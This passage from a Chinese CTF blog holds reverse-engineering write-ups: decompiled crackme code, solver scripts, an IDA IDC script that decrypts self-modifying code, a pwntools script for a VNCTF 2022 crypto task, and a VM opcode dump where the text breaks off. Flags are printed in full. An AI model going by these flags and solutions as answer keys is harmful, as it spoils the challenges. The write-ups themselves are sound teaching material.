cout&lt;&lt;flag&lt;&lt;endl;// int input[0x15];// int iVar4 = 5;// int DAT_00403374 = 48;// do {// int cVar1 = input[iVar4];// if (DAT_00403378-&gt;val + DAT_00403374 == cVar1) {// DAT_00403378 = DAT_00403378-&gt;loc1;// } else {// if (DAT_00403374 - DAT_00403378-&gt;val == cVar1) {// DAT_00403378 = DAT_00403378-&gt;loc2;// }// }// DAT_00403374 = input[iVar4];// iVar4 = iVar4 + 1;// } while (iVar4 &lt; 0x15);// if (((((input[0] == 'f') &amp;&amp; (input[1] == 'l')) &amp;&amp; (input[2] == 'a')) &amp;&amp;// ((input[3] == 'g' &amp;&amp; (input[4] == '{')))) &amp;&amp; (input[0x14] == '}')) {// if (DAT_00403378 == &amp;puVar3[31]) {// string s = \"Congratulations!!\\n\";// }// }}int main(){ fun(); return 0;} 注释部分是对于程序的一个正向还原，寻路用到了dfs算法，不是很难。 最后得到flag 1flag{d8b0bc97a6c0ba27} 天津垓题目里所有的内容都是假面骑士…… 首先可以关注到一个函数名为f 的函数，这个函数很简单 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116__int64 __fastcall f(__int64 a1, char **a2, char **a3){ _main(a1, (__int64)a2, (__int64)a3); printf(\"Authorize:\"); sub_1004011F6(); sub_100401AA0(); return 0i64;}int sub_1004011F6(){ char v1; // [rsp+20h] [rbp-D0h] char v2; // [rsp+21h] [rbp-CFh] char v3; // [rsp+22h] [rbp-CEh] char v4; // [rsp+23h] [rbp-CDh] char v5; // [rsp+24h] [rbp-CCh] char v6; // [rsp+25h] [rbp-CBh] char v7; // [rsp+26h] [rbp-CAh] char v8; // [rsp+27h] [rbp-C9h] char v9; // [rsp+28h] [rbp-C8h] char v10; // [rsp+29h] [rbp-C7h] char v11; // [rsp+2Ah] [rbp-C6h] char v12; // [rsp+2Bh] [rbp-C5h] char v13; // [rsp+2Ch] [rbp-C4h] char v14; // [rsp+2Dh] [rbp-C3h] char v15; // [rsp+2Eh] [rbp-C2h] char v16; // [rsp+2Fh] [rbp-C1h] char v17; // [rsp+30h] [rbp-C0h] char v18; // [rsp+31h] [rbp-BFh] char Format[4]; // [rsp+38h] [rbp-B8h] char v20[2]; // [rsp+3Dh] [rbp-B3h] __int64 v21; // [rsp+40h] [rbp-B0h] __int64 v22; // [rsp+48h] [rbp-A8h] __int16 v23; // [rsp+50h] [rbp-A0h] char v24; // [rsp+52h] [rbp-9Eh] __int64 v25; // [rsp+60h] [rbp-90h] __int64 v26; // [rsp+68h] [rbp-88h] __int64 v27; // [rsp+70h] [rbp-80h] __int64 v28; // [rsp+78h] [rbp-78h] __int64 v29; // [rsp+80h] [rbp-70h] __int16 v30; // [rsp+88h] [rbp-68h] __int64 v31; // [rsp+90h] [rbp-60h] __int64 v32; // [rsp+98h] [rbp-58h] __int64 v33; // [rsp+A0h] [rbp-50h] __int64 v34; // [rsp+A8h] [rbp-48h] __int64 v35; // [rsp+B0h] [rbp-40h] __int64 v36; // [rsp+B8h] [rbp-38h] __int64 v37; // [rsp+C0h] [rbp-30h] __int64 v38; // [rsp+C8h] [rbp-28h] __int64 v39; // [rsp+DCh] [rbp-14h] int v40; // [rsp+E4h] [rbp-Ch] __int16 v41; // [rsp+E8h] [rbp-8h] char v42; // [rsp+EAh] [rbp-6h] char v43; // [rsp+EBh] [rbp-5h] int i; // [rsp+ECh] [rbp-4h] v39 = 'H_gnisiR'; v40 = 'eppo'; v41 = '!r'; v42 = 0; v31 = 'eht nehW'; v32 = 'oh evif '; v33 = 'sorc snr'; v34 = 'g eht ,s'; v35 = 'os nedlo'; v36 = 'HT reidl'; v37 = 'si RESUO'; v38 = '\\n.nrob '; v25 = 't pmuj A'; v26 = 'ks eht o'; v27 = ' snrut y'; v28 = 'dir a ot'; v29 = '.kcik re'; v30 = '\\n'; v21 = 'etneserP'; v22 = 'IAZ yb d'; v23 = '\\nA'; v24 = 0; strcpy(v20, \"%s\"); strcpy(Format, \"%20s\"); v1 = 17; v2 = 8; v3 = 6; v4 = 10; v5 = 15; v6 = 20; v7 = 42; v8 = 59; v9 = 47; v10 = 3; v11 = 47; v12 = 4; v13 = 16; v14 = 72; v15 = 62; v16 = 0; v17 = 7; v18 = 16; scanf(Format, Str); if ( strlen(Str) != 18 ) { printf(v20, &amp;v25); exit(1); } for ( i = 0; i &lt;= 17; ++i ) { v43 = ~(Str[i] &amp; *((_BYTE *)&amp;v39 + i % 14)) &amp; (Str[i] | *((_BYTE *)&amp;v39 + i % 14)); if ( v43 != *(&amp;v1 + i) ) { printf(v20, &amp;v25); exit(1); } } printf(v20, &amp;v31); return printf(v20, &amp;v21);} 这里进行了简单的验证，中间得处理过程不是很好逆，因为涉及到与或非三种运算符，但是通过列真值表可以发现，这一串运算实际上和一个异或是一样的，所以这一部分就很好处理了 123456target = 'Rising_Hopper!'flag = ''v1 = [17, 8, 6, 10, 15, 20, 42, 59, 47, 3, 47, 4, 16, 72, 62, 0, 7, 16]for i in range(18): flag += chr(v1[i] ^ ord(target[i % 14]))print(flag) 输出Caucasus@s_ability，尝试提交发现不对，这题应该没这么简单，在找找有没有遗漏的地方，然后通过Str的交叉引用结果找到了遗漏的部分 123456int sub_100401A6C(){ sub_100401506(sub_10040164D, 1045, (__int64)Str); sub_10040162B(); return sub_10040164D();} 这个函数在输入并验证过Str之后又调用了我们的输入，肯定还会有后续的处理 1234567891011121314151617181920212223BOOL __fastcall sub_100401506(void *a1, int a2, __int64 a3){ BOOL result; // eax DWORD flOldProtect; // [rsp+28h] [rbp-8h] int i; // [rsp+2Ch] [rbp-4h] LPVOID lpAddress; // [rsp+40h] [rbp+10h] int v7; // [rsp+48h] [rbp+18h] __int64 v8; // [rsp+50h] [rbp+20h] lpAddress = a1; v7 = a2; v8 = a3; if ( strlen(Str) != 18 ) exit(1); if ( !VirtualProtect(lpAddress, v7, 0x40u, &amp;flOldProtect) ) exit(1); for ( i = 0; i &lt; v7; ++i ) *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % 18 + v8); result = VirtualProtect(lpAddress, v7, flOldProtect, &amp;flOldProtect); if ( !result ) exit(1); return result;} 这里是经过处理之后的内容，实际上是对一个地址上的数据进行了处理，显然是一个SMC的过程，这个地址里存储的应该是有用的处理代码，我们输入的内容实际上也只是对数据解密的密钥而已，所以接下来写个IDC脚本来解密一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;idc.idc&gt;static main() { auto start, end, addr; auto v1 = 67; auto v2 = 97; auto v3 = 117; auto v4 = 99; auto v5 = 97; auto v6 = 115; auto v7 = 117; auto v8 = 115; auto v9 = 64; auto v10 = 115; auto v11 = 95; auto v12 = 97; auto v13 = 98; auto v14 = 105; auto v15 = 108; auto v16 = 105; auto v17 = 116; auto v18 = 121; start = 0x10040164D; end = 0x100401A68;// auto flag = \"Caucasus@s_ability\"; auto flag; auto i = 0; for (addr = start; addr &lt; end; addr++) { if (i % 18 == 0) flag = v1; if (i % 18 == 1) flag = v2; if (i % 18 == 2) flag = v3; if (i % 18 == 3) flag = v4; if (i % 18 == 4) flag = v5; if (i % 18 == 5) flag = v6; if (i % 18 == 6) flag = v7; if (i % 18 == 7) flag = v8; if (i % 18 == 8) flag = v9; if (i % 18 == 9) flag = v10; if (i % 18 == 10) flag = v11; if (i % 18 == 11) flag = v12; if (i % 18 == 12) flag = v13; if (i % 18 == 13) flag = v14; if (i % 18 == 14) flag = v15; if (i % 18 == 15) flag = v16; if (i % 18 == 16) flag = v17; if (i % 18 == 17) flag = v18; PatchByte(addr, Byte(addr) ^ flag); i++; } AnalyzeArea(start, end); Message(\"Down!\");} 不是很会用IDC，而且还没有数组类型，只能这样用很多分支去判断，然后得到了新的汇编代码，如果是汇编很好的话就可以直接做了，我还是习惯了无脑F5，所以干脆patch了一下后面的垃圾数据，写了一个retn，然后创建函数，查看伪代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150int sub_10040164D(){ int result; // eax char Str[74]; // [rsp+20h] [rbp-60h] char v2[8]; // [rsp+6Ah] [rbp-16h] __int16 v3; // [rsp+78h] [rbp-8h] char v4; // [rsp+7Ah] [rbp-6h] char v5[4]; // [rsp+7Bh] [rbp-5h] char v6[8]; // [rsp+80h] [rbp+0h] char v7[8]; // [rsp+A0h] [rbp+20h] char Format[8]; // [rsp+D0h] [rbp+50h] int v9; // [rsp+110h] [rbp+90h] int v10; // [rsp+114h] [rbp+94h] int v11; // [rsp+118h] [rbp+98h] int v12; // [rsp+11Ch] [rbp+9Ch] int v13; // [rsp+120h] [rbp+A0h] int v14; // [rsp+124h] [rbp+A4h] int v15; // [rsp+128h] [rbp+A8h] int v16; // [rsp+12Ch] [rbp+ACh] int v17; // [rsp+130h] [rbp+B0h] int v18; // [rsp+134h] [rbp+B4h] int v19; // [rsp+138h] [rbp+B8h] int v20; // [rsp+13Ch] [rbp+BCh] int v21; // [rsp+140h] [rbp+C0h] int v22; // [rsp+144h] [rbp+C4h] int v23; // [rsp+148h] [rbp+C8h] int v24; // [rsp+14Ch] [rbp+CCh] int v25; // [rsp+150h] [rbp+D0h] int v26; // [rsp+154h] [rbp+D4h] int v27; // [rsp+158h] [rbp+D8h] int v28; // [rsp+15Ch] [rbp+DCh] int v29; // [rsp+160h] [rbp+E0h] int v30; // [rsp+164h] [rbp+E4h] int v31; // [rsp+168h] [rbp+E8h] int v32; // [rsp+16Ch] [rbp+ECh] int v33; // [rsp+170h] [rbp+F0h] int v34; // [rsp+174h] [rbp+F4h] int v35; // [rsp+178h] [rbp+F8h] int v36; // [rsp+17Ch] [rbp+FCh] int v37; // [rsp+180h] [rbp+100h] int v38; // [rsp+184h] [rbp+104h] int v39; // [rsp+188h] [rbp+108h] int v40; // [rsp+18Ch] [rbp+10Ch] int v41; // [rsp+190h] [rbp+110h] int v42; // [rsp+194h] [rbp+114h] int v43; // [rsp+198h] [rbp+118h] int v44; // [rsp+19Ch] [rbp+11Ch] int v45; // [rsp+1A0h] [rbp+120h] int v46; // [rsp+1A4h] [rbp+124h] int v47; // [rsp+1A8h] [rbp+128h] int v48; // [rsp+1ACh] [rbp+12Ch] int v49; // [rsp+1B0h] [rbp+130h] int v50; // [rsp+1B4h] [rbp+134h] int v51; // [rsp+1B8h] [rbp+138h] int v52; // [rsp+1BCh] [rbp+13Ch] int v53; // [rsp+1C0h] [rbp+140h] int v54; // [rsp+1C4h] [rbp+144h] int v55; // [rsp+1C8h] [rbp+148h] int v56; // [rsp+1CCh] [rbp+14Ch] int v57; // [rsp+1D0h] [rbp+150h] int v58; // [rsp+1D4h] [rbp+154h] int v59; // [rsp+1D8h] [rbp+158h] unsigned int v60; // [rsp+1E0h] [rbp+160h] int v61; // [rsp+1E4h] [rbp+164h] unsigned int v62; // [rsp+1E8h] [rbp+168h] unsigned int i; // [rsp+1ECh] [rbp+16Ch] v9 = 2007666; v10 = 2125764; v11 = 1909251; v12 = 2027349; v13 = 2421009; v14 = 1653372; v15 = 2047032; v16 = 2184813; v17 = 2302911; v18 = 2263545; v19 = 1909251; v20 = 2165130; v21 = 1968300; v22 = 2243862; v23 = 2066715; v24 = 2322594; v25 = 1987983; v26 = 2243862; v27 = 1869885; v28 = 2066715; v29 = 2263545; v30 = 1869885; v31 = 964467; v32 = 944784; v33 = 944784; v34 = 944784; v35 = 728271; v36 = 1869885; v37 = 2263545; v38 = 2283228; v39 = 2243862; v40 = 2184813; v41 = 2165130; v42 = 2027349; v43 = 1987983; v44 = 2243862; v45 = 1869885; v46 = 2283228; v47 = 2047032; v48 = 1909251; v49 = 2165130; v50 = 1869885; v51 = 2401326; v52 = 1987983; v53 = 2243862; v54 = 2184813; v55 = 885735; v56 = 2184813; v57 = 2165130; v58 = 1987983; v59 = 2460375; strcpy(Format, \"Input the flag to hijack the ability of Hiden Intelligence:\"); strcpy(v7, \"Progrise Key confirmed. Ready to break.\\n\"); strcpy(v6, \"Jacking Break! Zaia Enterprise.\"); strcpy(v5, \"%59s\"); v3 = 29477; v4 = 0; strcpy(v2, \"Not verified!\"); v62 = 2147483659; printf(Format); scanf(v5, Str); printf(v7); if ( strlen(Str) != 51 ) { printf(v2); exit(0); } v61 = 19683; for ( i = 0; i &lt;= 0x32; ++i ) { v60 = v61 * (unsigned int)(unsigned __int8)Str[i] % v62; if ( v60 != *(&amp;v9 + i) ) { printf(v2); exit(0); } } printf(v6); getchar(); result = getchar(); __asm { icebp } return result;} 关键的处理只有一句，但是有个很烦的取余，仔细观察可以发现，v62这个数非常大，最后在计算的时候取不取这个余数都没关系，所以这一部分又变成了一个非常简单的除法，然后问题就很容易解决了 1234567891011v9 = [2007666, 2125764, 1909251, 2027349, 2421009, 1653372, 2047032, 2184813, 2302911, 2263545, 1909251, 2165130, 1968300, 2243862, 2066715, 2322594, 1987983, 2243862, 1869885, 2066715, 2263545, 1869885, 964467, 944784, 944784, 944784, 728271, 1869885, 2263545, 2283228, 2243862, 2184813, 2165130, 2027349, 1987983, 2243862, 1869885, 2283228, 2047032, 1909251, 2165130, 1869885, 2401326, 1987983, 2243862, 2184813, 885735, 2184813, 2165130, 1987983, 2460375]v61 = 19683v62 = 0x8000000Bflag = ''for i in range(0x33): flag += chr(v9[i] // v61)print(flag) 输出flag 1flag{Thousandriver_is_1000%_stronger_than_zero-one} 后记然后这次比赛就没打算再做了，mobile的题，研究了一下，应该不是特别难，但是没太有时间，又是作业又是网课又是美赛，让人很烦，如果后面有wp放出来的话再去研究研究，复现一下，做个补充。","link":"/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-%E4%B8%A4%E9%81%93re-wp/"},{"title":"VNCTF 2022 wp","text":"题目质量还不错，断断续续做了一天，最后第9也还可以。 misc问卷填问卷 仔细找找图片转成黑白，可以直接看到flag vnctf{34aE@w} WebGameV4.0源码data里找到flag 解一下base64得到flag Cryptoezmath满足$$2^n-1\\mod15=0$$只需要满足 n=4x$$2^{4x}-1\\mod15=0$$ $$16^x-1\\mod15=0$$ $$(15+1)^x-1\\mod15=0$$ $$\\Sigma_{k=0}^xC_x^k15^k-1\\mod15=0$$ $$\\Sigma_{k=1}^xC_x^k15^k\\mod15=0$$ 满足要求，解析出来数字直接乘4就可以了 12345678910111213141516171819202122232425from pwn import *from pwnlib.util.iters import mbruteforceimport reimport hashlibp=remote(\"node4.buuoj.cn\",26203)s=p.recvline().decode()res=re.findall(r'XXXX\\+(.*)\\) == (.*)\\n',s)[0]part1=res[0]part2=res[1]charset = string.ascii_letters+string.digitsproof = mbruteforce(lambda x: hashlib.sha256((x+part1).encode()).hexdigest() ==part2, charset, 4, method='fixed')p.recvuntil(b\":\")p.sendline(proof.encode())for i in range(777): p.recvuntil(b\"the \") n=p.recvuntil(b\"t\")[:-1] # print(n) p.recv() p.sendline(str(4*int(n)).encode())print(p.recv()) reBabyMazepyc文件，前面加花，直接反编译会卡死，去花可以反编译，但是程序不难，直接看也能很容易看懂 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586870 LOAD_CONST 1: 1 2 STORE_FAST 0: x 4 LOAD_CONST 1: 1 6 STORE_FAST 1: y 8 LOAD_GLOBAL 0: input 10 CALL_FUNCTION 0 12 STORE_FAST 2: step 14 LOAD_GLOBAL 1: range 16 LOAD_GLOBAL 2: len 18 LOAD_FAST 2: step 20 CALL_FUNCTION 1 22 CALL_FUNCTION 1 24 GET_ITER 26 FOR_ITER 142 (to 170) 28 STORE_FAST 3: i 30 LOAD_FAST 2: step 32 LOAD_FAST 3: i 34 BINARY_SUBSCR 36 LOAD_CONST 2: 'w' 38 COMPARE_OP 2 (==) 40 POP_JUMP_IF_FALSE 52 42 LOAD_FAST 0: x 44 LOAD_CONST 1: 1 46 INPLACE_SUBTRACT 48 STORE_FAST 0: x 50 JUMP_FORWARD 72 (to 124) 52 LOAD_FAST 2: step 54 LOAD_FAST 3: i 56 BINARY_SUBSCR 58 LOAD_CONST 3: 's' 60 COMPARE_OP 2 (==) 62 POP_JUMP_IF_FALSE 74 64 LOAD_FAST 0: x 66 LOAD_CONST 1: 1 68 INPLACE_ADD 70 STORE_FAST 0: x 72 JUMP_FORWARD 50 (to 124) 74 LOAD_FAST 2: step 76 LOAD_FAST 3: i 78 BINARY_SUBSCR 80 LOAD_CONST 4: 'a' 82 COMPARE_OP 2 (==) 84 POP_JUMP_IF_FALSE 96 86 LOAD_FAST 1: y 88 LOAD_CONST 1: 1 90 INPLACE_SUBTRACT 92 STORE_FAST 1: y 94 JUMP_FORWARD 28 (to 124) 96 LOAD_FAST 2: step 98 LOAD_FAST 3: i 100 BINARY_SUBSCR 102 LOAD_CONST 5: 'd' 104 COMPARE_OP 2 (==) 106 POP_JUMP_IF_FALSE 118 108 LOAD_FAST 1: y 110 LOAD_CONST 1: 1 112 INPLACE_ADD 114 STORE_FAST 1: y 116 JUMP_FORWARD 6 (to 124) 118 POP_TOP 120 LOAD_CONST 6: False 122 RETURN_VALUE 124 LOAD_GLOBAL 3: _map 126 LOAD_FAST 0: x 128 BINARY_SUBSCR 130 LOAD_FAST 1: y 132 BINARY_SUBSCR 134 LOAD_CONST 1: 1 136 COMPARE_OP 2 (==) 138 POP_JUMP_IF_FALSE 146 140 POP_TOP 142 LOAD_CONST 6: False 144 RETURN_VALUE 146 LOAD_FAST 0: x 148 LOAD_CONST 7: 29 150 COMPARE_OP 2 (==) 152 POP_JUMP_IF_FALSE 26 154 LOAD_FAST 1: y 156 LOAD_CONST 7: 29 158 COMPARE_OP 2 (==) 160 POP_JUMP_IF_FALSE 26 162 POP_TOP 164 LOAD_CONST 8: True 166 RETURN_VALUE 168 JUMP_ABSOLUTE 26 170 LOAD_CONST 0: None 172 RETURN_VALUE wasd移动，导出地图，发现地图很小没必要写深搜，走一遍就行了 12345ans=\"ssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss\"import hashlibm=hashlib.md5()m.update(ans.encode())print(m.hexdigest()) cm狗vm，简单解析一下指令看看程序是不是很复杂 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556opcodes = [0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000057, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000065, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006C, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000063, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006F, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006D, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000065, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000020, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000074, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006F, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000020, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000056, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000004E, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000043, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000054, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000046, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000032, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000030, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000032, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000032, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000021, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000000A, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000069, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006E, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000070, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000075, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000074, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000020, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000066, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006C, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000061, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000067, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000003A, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000000A, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000013, 0x00000049, 0x00000001, 0x00000003, 0x00000000, 0x00000001, 0x00000001, 0x0000002B, 0x00000001, 0x00000002, 0x00000001, 0x00000061, 0x00000000, 0x00000000, 0x00000005, 0x00000000, 0x00000000, 0x00000008, 0x00000001, 0x00000002, 0x0000000E, 0x00000001, 0x00000003, 0x00000001, 0x00000000, 0x00000000, 0x00000005, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000006, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x00000002, 0x00000000, 0x00000006, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000006, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x00000002, 0x00000000, 0x00000006, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000006, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000007, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000007, 0x00000000, 0x00000002, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000007, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000007, 0x00000000, 0x00000002, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000007, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000007, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000008, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000008, 0x00000000, 0x00000002, 0x00000000, 0x00000008, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000008, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000008, 0x00000000, 0x00000002, 0x00000000, 0x00000008, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000008, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000008, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000009, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000009, 0x00000000, 0x00000002, 0x00000000, 0x00000009, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000009, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000009, 0x00000000, 0x00000002, 0x00000000, 0x00000009, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000009, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000009, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000A, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000002, 0x00000000, 0x0000000A, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000A, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000002, 0x00000000, 0x0000000A, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000A, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000B, 0x00000000, 0x00000002, 0x00000000, 0x0000000B, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000B, 0x00000000, 0x00000002, 0x00000000, 0x0000000B, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000B, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000C, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000C, 0x00000000, 0x00000002, 0x00000000, 0x0000000C, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000C, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000C, 0x00000000, 0x00000002, 0x00000000, 0x0000000C, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000C, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000C, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000D, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000D, 0x00000000, 0x00000002, 0x00000000, 0x0000000D, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000D, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000D, 0x00000000, 0x00000002, 0x00000000, 0x0000000D, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000D, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000D, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000E, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000E, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000E, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000E, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000F, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x0000000F, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000F, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x0000000F, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000F, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000F, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x00000010, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000010, 0x00000000, 